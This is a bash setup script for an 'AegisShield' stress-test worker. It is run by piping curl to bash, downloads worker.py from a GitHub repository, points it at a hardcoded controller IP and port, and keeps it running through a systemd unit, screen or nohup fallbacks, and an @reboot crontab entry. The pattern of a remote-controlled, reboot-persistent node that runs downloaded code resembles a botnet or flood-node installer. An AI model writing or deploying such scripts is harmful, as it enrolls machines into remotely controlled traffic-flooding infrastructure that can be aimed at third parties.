#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  AegisShield Worker — One-Line Background Setup
#  curl -sL <url>/setup_worker.sh | bash -s <CONTROLLER_IP> <PORT>
# ═══════════════════════════════════════════════════════════════
set -e

CONTROLLER_IP=${1:-"159.65.32.13"}
CONTROLLER_PORT=${2:-7777}
INSTALL_DIR="/opt/aegis"

echo ""
echo "  ╔═══════════════════════════════════════════════════╗"
echo "  ║  AegisShield Worker — Background Auto Setup       ║"
echo "  ╚═══════════════════════════════════════════════════╝"
echo ""

# ── 1. Install Python3 ────────────────────────────────────────
if ! command -v python3 &>/dev/null; then
    echo "  [1/5] Installing Python3..."
    apt-get update -qq && apt-get install -y -qq python3 >/dev/null 2>&1 || \
    yum install -y python3 >/dev/null 2>&1 || \
    apk add python3 >/dev/null 2>&1
else
    echo "  [1/5] Python3 ✅"
fi

# ── 2. Install screen ─────────────────────────────────────────
if ! command -v screen &>/dev/null; then
    echo "  [2/5] Installing screen..."
    apt-get install -y -qq screen >/dev/null 2>&1 || \
    yum install -y screen >/dev/null 2>&1 || \
    apk add screen >/dev/null 2>&1 || true
fi

# ── 3. Download worker.py ────────────────────────────────────
echo "  [3/5] Downloading worker.py..."
mkdir -p "$INSTALL_DIR"
curl -sL https://raw.githubusercontent.com/k4ran909/stress-tester/master/worker.py -o "${INSTALL_DIR}/worker.py"
chmod +x "${INSTALL_DIR}/worker.py"

# ── 4. Kill any old worker ────────────────────────────────────
echo "  [4/5] Cleaning old instances..."
screen -ls 2>/dev/null | grep -q "aegis-worker" && screen -X -S aegis-worker quit 2>/dev/null || true
systemctl stop aegis-worker 2>/dev/null || true
pkill -f "worker.py --master" 2>/dev/null || true
sleep 1

# ── 5. Start worker in background ────────────────────────────
echo "  [5/5] Starting worker in background..."

# Method A: systemd (best — auto-restart, survives reboot)
if command -v systemctl &>/dev/null; then
    cat > /etc/systemd/system/aegis-worker.service << EOF
[Unit]
Description=AegisShield Stress Worker
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 ${INSTALL_DIR}/worker.py --master ${CONTROLLER_IP}:${CONTROLLER_PORT}
Restart=always
RestartSec=5
StartLimitInterval=0

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable aegis-worker >/dev/null 2>&1
    systemctl start aegis-worker

    sleep 2
    if systemctl is-active --quiet aegis-worker; then
        MODE="systemd"
    else
        MODE="fallback"
    fi
else
    MODE="fallback"
fi

# Method B: screen fallback
if [ "$MODE" = "fallback" ]; then
    if command -v screen &>/dev/null; then
        screen -dmS aegis-worker python3 "${INSTALL_DIR}/worker.py" --master "${CONTROLLER_IP}:${CONTROLLER_PORT}"
        sleep 2
        if screen -ls | grep -q "aegis-worker"; then
            MODE="screen"
        else
            MODE="nohup"
        fi
    else
        MODE="nohup"
    fi
fi

# Method C: nohup fallback
if [ "$MODE" = "nohup" ]; then
    nohup python3 "${INSTALL_DIR}/worker.py" --master "${CONTROLLER_IP}:${CONTROLLER_PORT}" > /var/log/aegis-worker.log 2>&1 &
    sleep 2
fi

# ── Verify ────────────────────────────────────────────────────
echo ""
echo "  ╔═══════════════════════════════════════════════════╗"
echo "  ║  ✅ Worker is RUNNING IN BACKGROUND               ║"
echo "  ╠═══════════════════════════════════════════════════╣"
echo "  ║  Controller: ${CONTROLLER_IP}:${CONTROLLER_PORT}  "
echo "  ║  Mode: ${MODE}                                    "
echo "  ║  Auto-restart: YES                                ║"
echo "  ║  Survives reboot: $([ "$MODE" = "systemd" ] && echo "YES" || echo "NO (add to crontab)")  "
echo "  ╚═══════════════════════════════════════════════════╝"
echo ""

if [ "$MODE" = "systemd" ]; then
    echo "  📋 Commands:"
    echo "     systemctl status aegis-worker      # status"
    echo "     journalctl -u aegis-worker -f      # live logs"
    echo "     systemctl restart aegis-worker     # restart"
    echo "     systemctl stop aegis-worker        # stop"
elif [ "$MODE" = "screen" ]; then
    echo "  📋 Commands:"
    echo "     screen -r aegis-worker             # view logs"
    echo "     Ctrl+A then D                      # detach"
else
    echo "  📋 Logs: tail -f /var/log/aegis-worker.log"
fi
echo ""

# ── Add crontab for non-systemd (reboot persistence) ─────────
if [ "$MODE" != "systemd" ]; then
    CRON_CMD="@reboot python3 ${INSTALL_DIR}/worker.py --master ${CONTROLLER_IP}:${CONTROLLER_PORT} >> /var/log/aegis-worker.log 2>&1 &"
    (crontab -l 2>/dev/null | grep -v "aegis"; echo "$CRON_CMD") | crontab - 2>/dev/null || true
    echo "  🔄 Added to crontab for reboot persistence"
fi
